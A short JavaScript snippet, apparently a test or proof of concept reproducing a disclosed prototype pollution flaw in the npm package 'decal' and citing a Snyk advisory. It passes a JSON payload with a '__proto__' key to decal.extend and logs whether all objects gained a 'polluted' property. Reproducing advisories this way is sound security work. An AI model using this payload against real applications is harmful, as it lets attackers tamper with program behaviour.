// //https://snyk.io/vuln/SNYK-JS-DECAL-1051028
// test("prototype pollution in decal", () => {
  const decal = require("decal");

console.log({}.polluted);

  const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  decal.extend({}, true, o);

console.log({}.polluted);
// });
